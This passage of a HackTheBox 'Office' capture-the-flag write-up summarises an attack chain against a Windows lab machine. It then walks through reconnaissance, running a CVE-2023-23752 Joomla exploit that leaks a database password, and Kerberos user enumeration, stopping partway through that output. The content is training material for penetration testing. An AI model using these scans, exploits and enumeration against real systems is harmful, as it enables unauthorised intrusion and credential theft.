<!doctype html><html lang=en><head><title>HTB Office WriteUp · gunzf0x
</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="gunzf0x"><meta name=description content="HackTheBox 'Office' WriteUp"><meta name=keywords content="blog,pentesting,hacking,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content="HTB Office WriteUp"><meta name=twitter:description content="HackTheBox 'Office' WriteUp"><meta property="og:url" content="https://gunzf0x.github.io/pentesting/posts/office/"><meta property="og:site_name" content="gunzf0x"><meta property="og:title" content="HTB Office WriteUp"><meta property="og:description" content="HackTheBox 'Office' WriteUp"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-06-22T00:00:00+00:00"><meta property="article:modified_time" content="2024-06-22T00:00:00+00:00"><meta property="article:tag" content="HTB"><meta property="article:tag" content="Machine"><meta property="article:tag" content="Windows"><meta property="article:tag" content="Hard"><meta property="article:tag" content="Pivoting"><meta property="article:tag" content="Runascs"><link rel=canonical href=https://gunzf0x.github.io/pentesting/posts/office/><link rel=preload href=/fonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/pentesting/css/coder.min.577e3c5ead537873430da16f0964b754a120fd87c4e2203a00686e7c75b51378.css integrity="sha256-V348Xq1TeHNDDaFvCWS3VKEg/YfE4iA6AGhufHW1E3g=" crossorigin=anonymous media=screen><link rel=stylesheet href=/pentesting/css/coder-dark.min.b587cb1f00f2309d3943f06d512873c8c174188c45cb8406de0bfe6523023297.css integrity="sha256-tYfLHwDyMJ05Q/BtUShzyMF0GIxFy4QG3gv+ZSMCMpc=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=any><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/pentesting/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/pentesting/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/pentesting/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/pentesting/images/safari-pinned-tab.svg color=#5bbad5></head><body class="preload-transitions colorscheme-auto"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/pentesting>gunzf0x
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/pentesting/about/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/posts/>Blog/WriteUps</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/projects/>Projects</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/contact/>Contact me</a></li><li class="navigation-item menu-separator"><span>|</span></li><li class=navigation-item><a href=/pentesting/es/posts/office/>🇨🇱</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://gunzf0x.github.io/pentesting/posts/office/>HTB Office WriteUp</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa-solid fa-calendar" aria-hidden=true></i>
<time datetime=2024-06-22T00:00:00Z>22 June, 2024
</time></span><span class=reading-time><i class="fa-solid fa-clock" aria-hidden=true></i>
25-minute read</span></div><div class=tags><i class="fa-solid fa-tag" aria-hidden=true></i>
<span class=tag><a href=/pentesting/tags/htb/>HTB</a>
</span><span class=separator>•</span>
<span class=tag><a href=/pentesting/tags/machine/>Machine</a>
</span><span class=separator>•</span>
<span class=tag><a href=/pentesting/tags/windows/>Windows</a>
</span><span class=separator>•</span>
<span class=tag><a href=/pentesting/tags/hard/>Hard</a>
</span><span class=separator>•</span>
<span class=tag><a href=/pentesting/tags/pivoting/>Pivoting</a>
</span><span class=separator>•</span>
<span class=tag><a href=/pentesting/tags/runascs/>Runascs</a>
</span><span class=separator>•</span>
<span class=tag><a href=/pentesting/tags/cmd/>Cmd</a>
</span><span class=separator>•</span>
<span class=tag><a href=/pentesting/tags/netcat/>Netcat</a>
</span><span class=separator>•</span>
<span class=tag><a href=/pentesting/tags/winpeas/>Winpeas</a>
</span><span class=separator>•</span>
<span class=tag><a href=/pentesting/tags/mimikatz/>Mimikatz</a>
</span><span class=separator>•</span>
<span class=tag><a href=/pentesting/tags/go/>Go</a>
</span><span class=separator>•</span>
<span class=tag><a href=/pentesting/tags/kerbrute/>Kerbrute</a>
</span><span class=separator>•</span>
<span class=tag><a href=/pentesting/tags/smb/>Smb</a>
</span><span class=separator>•</span>
<span class=tag><a href=/pentesting/tags/chisel/>Chisel</a>
</span><span class=separator>•</span>
<span class=tag><a href=/pentesting/tags/wireshark/>Wireshark</a>
</span><span class=separator>•</span>
<span class=tag><a href=/pentesting/tags/certutil/>Certutil</a>
</span><span class=separator>•</span>
<span class=tag><a href=/pentesting/tags/evil-winrm/>Evil-Winrm</a>
</span><span class=separator>•</span>
<span class=tag><a href=/pentesting/tags/whatweb/>Whatweb</a>
</span><span class=separator>•</span>
<span class=tag><a href=/pentesting/tags/netexec/>Netexec</a>
</span><span class=separator>•</span>
<span class=tag><a href=/pentesting/tags/gobuster/>Gobuster</a>
</span><span class=separator>•</span>
<span class=tag><a href=/pentesting/tags/joomla/>Joomla</a>
</span><span class=separator>•</span>
<span class=tag><a href=/pentesting/tags/droopescan/>Droopescan</a>
</span><span class=separator>•</span>
<span class=tag><a href=/pentesting/tags/hashcat/>Hashcat</a>
</span><span class=separator>•</span>
<span class=tag><a href=/pentesting/tags/sharpgpoabuse/>Sharpgpoabuse</a>
</span><span class=separator>•</span>
<span class=tag><a href=/pentesting/tags/libreoffice/>Libreoffice</a></span></div></div></header><div class=post-content><h1 id=office----hackthebox>Office &ndash; HackTheBox
<a class=heading-link href=#office----hackthebox><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h1><ul><li>OS: <em>Windows</em></li><li>Difficulty: <em>Hard</em></li><li>Platform: <em>HackTheBox</em></li></ul><p><img alt="&lsquo;Office&rsquo; Avatar" src=/pentesting/images/Office_avatar.png></p><hr><h2 id=summary>Summary
<a class=heading-link href=#summary><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p><code>Office</code> is a hard <code>Windows</code> machine from the platform HackTheBox. In this machine we are able to find a deprecated <code>Joomla</code> blog which version is vulnerable to <a href=https://nvd.nist.gov/vuln/detail/CVE-2023-23752 class=external-link target=_blank rel=noopener>CVE-2023-23752</a>; this allows us to obtain initial credentials. With these credentials we are able to find shared resources in <code>Service Message Block</code> (<code>SMB</code>), where we find among them a <code>.pcap</code> traffic data file. We use the tool <code>Wireshark</code> to analyze this <code>.pcap</code> file and we are able to extract a <code>Kerberos</code> hash from it. We are able to attempt a bruteforce password cracking against this hash, where we find new credentials. These new credentials, after playing with some usernames, works in the <code>Joomla</code> login panel; where we are able to upload a webshell and gain an initial access to the target machine. Once inside, we are agble to pivot from the user that runs the webserver to one of the users inside the machine since one of the previously found credentials worked on them using the tool <code>RunasCs</code>. Once we have reached this new user, we check the internal ports open in the machine. Among them there is an uncommon one which results to be a webpage and allows us to upload, after using <code>Chisel</code> to reach a <code>Remote Port Forwarding</code>, an <code>.odt</code> file that allows us to gain Remote Code Execution thanks to the vulnerability <a href=https://nvd.nist.gov/vuln/detail/CVE-2023-2255 class=external-link target=_blank rel=noopener>CVE-2023-2255</a>. In this way we gain access to a new user; this new user is able to see credentials that uses <code>Data Protection API</code> (<code>DPAPI</code>) encryption method. Using the tool <code>mimikatz</code> and these credentials we are able to find credentials for a final user. This new user allows us to connect to the victim machine via <code>Windows Remote Management</code> (<code>WinRM</code>) and belongs to the group <code>GPO</code>. Abusing this group, using tools like <code>SharpGPOAbuse</code>, we are able to add ourselves to the group <code>Administrators</code> and obtain total control over the target machine.</p><hr><h2 id=user>User
<a class=heading-link href=#user><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p><code>Nmap</code> scan shows multiple ports open: <code>53</code> <code>Domain Name System</code> (<code>DNS</code>), <code>80</code> <code>HTTP</code>, <code>88</code> <code>Kerberos</code>, <code>389</code> <code>Lightweight Directory Access Protocol</code> (<code>LDAP</code>), <code>443</code> <code>HTTPs</code>, <code>445</code> <code>Server Message Block</code> (<code>SMB</code>), and <code>5985</code> <code>Windows Remote Management</code> (<code>WinRM</code>); among many others.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>❯ sudo nmap -sS --open -p- --min-rate=5000 -n -Pn -vvv 10.10.11.3 -oG allPorts
</span></span></span></code></pre></div><p>and checking their versions:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>❯ sudo nmap -sVC -p53,80,88,139,389,443,445,464,593,636,3268,3269,5985,9389,49664,49669,49675,49680,51987 10.10.11.3 -oN targeted
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-20 20:39 -04
</span></span></span><span class=line><span class=cl><span class=go>Nmap scan report for 10.10.11.3
</span></span></span><span class=line><span class=cl><span class=go>Host is up (0.27s latency).
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PORT      STATE SERVICE       VERSION
</span></span></span><span class=line><span class=cl><span class=go>53/tcp    open  domain        Simple DNS Plus
</span></span></span><span class=line><span class=cl><span class=go>80/tcp    open  http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Home
</span></span></span><span class=line><span class=cl><span class=go>| http-robots.txt: 16 disallowed entries (15 shown)
</span></span></span><span class=line><span class=cl><span class=go>| /joomla/administrator/ /administrator/ /api/ /bin/
</span></span></span><span class=line><span class=cl><span class=go>| /cache/ /cli/ /components/ /includes/ /installation/
</span></span></span><span class=line><span class=cl><span class=go>|_/language/ /layouts/ /libraries/ /logs/ /modules/ /plugins/
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
</span></span></span><span class=line><span class=cl><span class=go>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-05-21 08:40:05Z)
</span></span></span><span class=line><span class=cl><span class=go>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span></span><span class=line><span class=cl><span class=go>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
</span></span></span><span class=line><span class=cl><span class=go>|_ssl-date: 2024-05-21T08:41:42+00:00; +8h00m02s from scanner time.
</span></span></span><span class=line><span class=cl><span class=go>| ssl-cert: Subject: commonName=DC.office.htb
</span></span></span><span class=line><span class=cl><span class=go>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.office.htb
</span></span></span><span class=line><span class=cl><span class=go>| Not valid before: 2023-05-10T12:36:58
</span></span></span><span class=line><span class=cl><span class=go>|_Not valid after:  2024-05-09T12:36:58
</span></span></span><span class=line><span class=cl><span class=go>443/tcp   open  ssl/http      Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28)
</span></span></span><span class=line><span class=cl><span class=go>|_ssl-date: TLS randomness does not represent time
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: 403 Forbidden
</span></span></span><span class=line><span class=cl><span class=go>| ssl-cert: Subject: commonName=localhost
</span></span></span><span class=line><span class=cl><span class=go>| Not valid before: 2009-11-10T23:48:47
</span></span></span><span class=line><span class=cl><span class=go>|_Not valid after:  2019-11-08T23:48:47
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
</span></span></span><span class=line><span class=cl><span class=go>| tls-alpn:
</span></span></span><span class=line><span class=cl><span class=go>|_  http/1.1
</span></span></span><span class=line><span class=cl><span class=go>445/tcp   open  microsoft-ds?
</span></span></span><span class=line><span class=cl><span class=go>464/tcp   open  kpasswd5?
</span></span></span><span class=line><span class=cl><span class=go>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span></span><span class=line><span class=cl><span class=go>636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
</span></span></span><span class=line><span class=cl><span class=go>|_ssl-date: 2024-05-21T08:41:43+00:00; +8h00m02s from scanner time.
</span></span></span><span class=line><span class=cl><span class=go>| ssl-cert: Subject: commonName=DC.office.htb
</span></span></span><span class=line><span class=cl><span class=go>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.office.htb
</span></span></span><span class=line><span class=cl><span class=go>| Not valid before: 2023-05-10T12:36:58
</span></span></span><span class=line><span class=cl><span class=go>|_Not valid after:  2024-05-09T12:36:58
</span></span></span><span class=line><span class=cl><span class=go>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
</span></span></span><span class=line><span class=cl><span class=go>|_ssl-date: 2024-05-21T08:41:42+00:00; +8h00m02s from scanner time.
</span></span></span><span class=line><span class=cl><span class=go>| ssl-cert: Subject: commonName=DC.office.htb
</span></span></span><span class=line><span class=cl><span class=go>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.office.htb
</span></span></span><span class=line><span class=cl><span class=go>| Not valid before: 2023-05-10T12:36:58
</span></span></span><span class=line><span class=cl><span class=go>|_Not valid after:  2024-05-09T12:36:58
</span></span></span><span class=line><span class=cl><span class=go>3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
</span></span></span><span class=line><span class=cl><span class=go>|_ssl-date: 2024-05-21T08:41:43+00:00; +8h00m01s from scanner time.
</span></span></span><span class=line><span class=cl><span class=go>| ssl-cert: Subject: commonName=DC.office.htb
</span></span></span><span class=line><span class=cl><span class=go>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.office.htb
</span></span></span><span class=line><span class=cl><span class=go>| Not valid before: 2023-05-10T12:36:58
</span></span></span><span class=line><span class=cl><span class=go>|_Not valid after:  2024-05-09T12:36:58
</span></span></span><span class=line><span class=cl><span class=go>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Not Found
</span></span></span><span class=line><span class=cl><span class=go>9389/tcp  open  mc-nmf        .NET Message Framing
</span></span></span><span class=line><span class=cl><span class=go>49664/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>49669/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span></span><span class=line><span class=cl><span class=go>49680/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>51987/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>Service Info: Hosts: DC, www.example.com; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Host script results:
</span></span></span><span class=line><span class=cl><span class=go>| smb2-time:
</span></span></span><span class=line><span class=cl><span class=go>|   date: 2024-05-21T08:40:59
</span></span></span><span class=line><span class=cl><span class=go>|_  start_date: N/A
</span></span></span><span class=line><span class=cl><span class=go>| smb2-security-mode:
</span></span></span><span class=line><span class=cl><span class=go>|   3:1:1:
</span></span></span><span class=line><span class=cl><span class=go>|_    Message signing enabled and required
</span></span></span><span class=line><span class=cl><span class=go>|_clock-skew: mean: 8h00m01s, deviation: 0s, median: 8h00m01s
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span class=line><span class=cl><span class=go>Nmap done: 1 IP address (1 host up) scanned in 106.67 seconds
</span></span></span></code></pre></div><p>Visiting the site <code>http://10.10.11.3</code> shows a simple blog page:</p><p><img alt="Office 1" src=/pentesting/images/Office_1.png></p><p>Using <code>WhatWeb</code> against this page shows that we are against a blog running on <code>Joomla</code> (a <code>Content Management System</code>):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>❯ whatweb http://10.10.11.3
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>http://10.10.11.3 [200 OK] Apache[2.4.56], Cookies[3815f63d17a9109b26eb1b8c114159ac], Country[RESERVED][ZZ], HTML5, HTTPServer[Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28], HttpOnly[3815f63d17a9109b26eb1b8c114159ac], IP[10.10.11.3], MetaGenerator[Joomla! - Open Source Content Management], OpenSSL[1.1.1t], PHP[8.0.28], PasswordField[password], PoweredBy[the], Script[application/json,application/ld+json,module], Title[Home], UncommonHeaders[referrer-policy,cross-origin-opener-policy], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/8.0.28]
</span></span></span></code></pre></div><p>I search for some info in the blog posts, but nothing interesting. Just a bunch of info about Iron Man.</p><p>Looking at <code>SMB</code> service, it does not allow anonymous login:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>❯ smbmap -H 10.10.11.3 --no-banner
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[*] Detected 1 hosts serving SMB
</span></span></span><span class=line><span class=cl><span class=go>[*] Established 0 SMB session(s)
</span></span></span></code></pre></div><p>so I will pass from this service at the moment</p><p>At this point I will start searching for directories attempting a <code>Brute Force Directory Listing</code> with <code>Gobuster</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>❯ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.11.3 -t 55 --add-slash -s 200 -b &#39;&#39; --exclude-length 31
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Gobuster v3.6
</span></span></span><span class=line><span class=cl><span class=go>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>[+] Url:              http://10.10.11.3
</span></span></span><span class=line><span class=cl><span class=go>[+] Method:           GET
</span></span></span><span class=line><span class=cl><span class=go>[+] Threads:          55
</span></span></span><span class=line><span class=cl><span class=go>[+] Wordlist:         /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
</span></span></span><span class=line><span class=cl><span class=go>[+] Status codes:     200
</span></span></span><span class=line><span class=cl><span class=go>[+] Exclude Length:   31
</span></span></span><span class=line><span class=cl><span class=go>[+] User Agent:       gobuster/3.6
</span></span></span><span class=line><span class=cl><span class=go>[+] Add Slash:        true
</span></span></span><span class=line><span class=cl><span class=go>[+] Timeout:          10s
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Starting gobuster in directory enumeration mode
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>/icons/               (Status: 200) [Size: 74798]
</span></span></span><span class=line><span class=cl><span class=go>/administrator/       (Status: 200) [Size: 12318]
</span></span></span><span class=line><span class=cl><span class=go>/Administrator/       (Status: 200) [Size: 12318]
</span></span></span><span class=line><span class=cl><span class=go>Progress: 220560 / 220561 (100.00%)
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Finished
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span></code></pre></div><p>where I can see an <code>/administrator</code> directory.</p><p>Visiting <code>http://10.10.11.3/administrator/</code> shows the <code>Joomla</code> panel login:</p><p><img alt="Office 2" src=/pentesting/images/Office_2.png></p><p>Then I decide to run <code>droopescan</code> to attempt to get the version:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>❯ droopescan scan joomla --url http://10.10.11.3/
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] No version found.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] Possible interesting urls found:
</span></span></span><span class=line><span class=cl><span class=go>    Detailed version information. - http://10.10.11.3/administrator/manifests/files/joomla.xml
</span></span></span><span class=line><span class=cl><span class=go>    Login page. - http://10.10.11.3/administrator/
</span></span></span><span class=line><span class=cl><span class=go>    License file. - http://10.10.11.3/LICENSE.txt
</span></span></span><span class=line><span class=cl><span class=go>    Version attribute contains approx version - http://10.10.11.3/plugins/system/cache/cache.xml
</span></span></span></code></pre></div><p>and even if the script itself does not tells us the version, we can visit the suggested url from the output. For example, using <code>cURL</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>❯ curl -s http://10.10.11.3/administrator/manifests/files/joomla.xml | grep &#39;version&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
</span></span></span><span class=line><span class=cl><span class=go>        &lt;license&gt;GNU General Public License version 2 or later; see LICENSE.txt&lt;/license&gt;
</span></span></span><span class=line><span class=cl><span class=go>        &lt;version&gt;4.2.7&lt;/version&gt;
</span></span></span></code></pre></div><p>so we have a version: <code>4.2.7</code></p><p>I remember that back in the days I made an <a href=https://github.com/gunzf0x/CVE-2023-23752/ class=external-link target=_blank rel=noopener>exploit</a> for this vulnerable version for <code>CVE-2023-23752</code>, for <a href=https://app.hackthebox.com/machines/577 class=external-link target=_blank rel=noopener><code>Devvortex</code></a> machine. Basically, an improper access check allows unauthorized access to webservice endpoints; this results in data leaked. So, I use <a href=https://github.com/gunzf0x/CVE-2023-23752/ class=external-link target=_blank rel=noopener>my repository</a>, written in <code>Go</code>, for this:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>❯ git clone https://github.com/gunzf0x/CVE-2023-23752.git
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Cloning into &#39;CVE-2023-23752&#39;...
</span></span></span><span class=line><span class=cl><span class=go>remote: Enumerating objects: 30, done.
</span></span></span><span class=line><span class=cl><span class=go>remote: Counting objects: 100% (30/30), done.
</span></span></span><span class=line><span class=cl><span class=go>remote: Compressing objects: 100% (21/21), done.
</span></span></span><span class=line><span class=cl><span class=go>remote: Total 30 (delta 9), reused 30 (delta 9), pack-reused 0
</span></span></span><span class=line><span class=cl><span class=go>Receiving objects: 100% (30/30), 20.11 MiB | 3.45 MiB/s, done.
</span></span></span><span class=line><span class=cl><span class=go>Resolving deltas: 100% (9/9), done.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>❯ cd CVE-2023-23752
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>❯ ls -la
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>total 40
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 4 gunzf0x gunzf0x 4096 May 20 21:49 .
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 3 gunzf0x gunzf0x 4096 May 20 21:49 ..
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 2 gunzf0x gunzf0x 4096 May 20 21:49 binaries
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 8 gunzf0x gunzf0x 4096 May 20 21:49 .git
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x  158 May 20 21:49 go.mod
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x  382 May 20 21:49 go.sum
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x 1064 May 20 21:49 LICENCE
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x 6092 May 20 21:49 main.go
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x  374 May 20 21:49 README.md
</span></span></span></code></pre></div><p>and run it:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>❯ go run main.go -u http://10.10.11.3
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=gp>#</span><span class=c1>#####################################################</span>
</span></span><span class=line><span class=cl><span class=gp>#</span><span class=c1>################## CVE-2023-23752 ###################</span>
</span></span><span class=line><span class=cl><span class=gp>#</span><span class=c1>#####################################################</span>
</span></span><span class=line><span class=cl><span class=go>                                            by gunzf0x
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[*] Extracting data from &#39;http://10.10.11.3&#39;...
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>    ----&gt; Database Type: mysqli
</span></span></span><span class=line><span class=cl><span class=go>    ----&gt; Hostname: localhost
</span></span></span><span class=line><span class=cl><span class=go>    ----&gt; User: root
</span></span></span><span class=line><span class=cl><span class=go>    ----&gt; Password: H0lOgrams4reTakIng0Ver754!
</span></span></span><span class=line><span class=cl><span class=go>    ----&gt; Database: joomla_db
</span></span></span><span class=line><span class=cl><span class=go>    ----&gt; Database Prefix: if2tx_
</span></span></span></code></pre></div><p>where we have credentials: <code>root:H0lOgrams4reTakIng0Ver754!</code>.</p><p>However, these credentials do not work in the login <code>Joomla</code> panel.</p><p>At this point I have a potential password, but I need users. Since I remember that port <code>88</code> with <code>Kerberos</code> service was running, we could try to run <code>Kerbrute</code> to get users. First, I use <code>NetExec</code> just to get the domain name:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>❯ netexec smb 10.10.11.3
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
</span></span></span></code></pre></div><p>where the domain name is <code>office.htb</code>.</p><p>Now that we have the domain name, use <code>Kerbrute</code> (which can be downloaded from <a href=https://github.com/ropnop/kerbrute class=external-link target=_blank rel=noopener>its Github repository</a>):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>❯ kerbrute userenum --dc 10.10.11.3 -d office.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 50
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>    __             __               __
</span></span></span><span class=line><span class=cl><span class=go>   / /_____  _____/ /_  _______  __/ /____
</span></span></span><span class=line><span class=cl><span class=go>  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
</span></span></span><span class=line><span class=cl><span class=go> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
</span></span></span><span class=line><span class=cl><span class=go>/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Version: v1.0.3 (9dad6e1) - 05/20/24 - Ronnie Flathers @ropnop
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>2024/05/20 21:59:22 &gt;  Using KDC(s):
</span></span></span><span class=line><span class=cl><span class=go>2024/05/20 21:59:22 &gt;   10.10.11.3:88
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>2024/05/20 21:59:28 &gt;  [+] VALID USERNAME:       administrator@office.htb
</span></span></span><span class=line><span class=cl><span class=go>2024/05/20 22:00:09 &gt;  [+] VALID USERNAME:       Administrator@office.htb
